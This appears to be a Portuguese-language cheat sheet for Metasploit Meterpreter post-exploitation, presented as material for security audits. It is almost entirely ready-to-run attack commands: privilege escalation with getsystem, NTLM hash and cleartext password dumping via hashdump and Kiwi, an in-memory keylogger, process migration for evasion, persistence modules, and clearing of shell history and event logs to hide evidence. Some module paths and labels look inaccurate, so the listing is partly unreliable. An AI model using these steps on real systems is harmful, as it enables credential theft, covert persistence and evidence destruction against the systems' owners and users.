🧗 Pós-Exploração & Pivoting em Ambientes Comprometidos

Visão Geral: A fase de pós-exploração consolida o acesso obtido no host alvo, escalando privilégios para administrador (root/SYSTEM), extraindo credenciais da memória e garantindo persistência para auditorias de segurança avançadas.

1. Coleta e Reconhecimento Local com Meterpreter

Comando Resultado Obtido Finalidade
sysinfo Sistema operacional, arquitetura (x86/x64) e hostname. Panorama geral da máquina.
getuid Usuário do processo atual (ex: uid=1000 ou NT AUTHORITY\SYSTEM). Verificação de privilégios.
ps Listagem de todos os processos em execução. Identificação de antivírus e processos para migração.
migrate <PID> Injeta a DLL do Meterpreter dentro de outro processo estável (ex: explorer.exe). Estabilidade e evasão de detecção.

2. Escalação de Privilégios (Privilege Escalation)

# Tentativa automatizada de elevação:
getsystem

# Caso falhe, utilizar o sugestor de exploits locais:
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

3. Extração de Credenciais & Memória

# Extrair hashes NTLM locais (exige SYSTEM no Windows):
hashdump

# Carregar extensão Mimikatz / Kiwi para extrair senhas em texto claro da memória:
load kiwi
creds_all

# Captura de teclas em tempo real (Keylogger em memória):
keyscan_start
# ... aguardar digitação do usuário ...
keyscan_dump
keyscan_stop

4. Técnicas de Persistência

  • Criação de Serviço Remoto: use post/linux/persistence/service
  • Registro do Windows (Run Keys): use post/windows/persistence/persistence_service
  • Tarefas Agendadas / Crontab: use post/linux/gather/cron_backdoor

5. Limpeza de Evidências (Anti-Forense)

# No Linux:
run post/linux/manage/clear_history

# No Windows:
run post/windows/manage/clear_event_logs
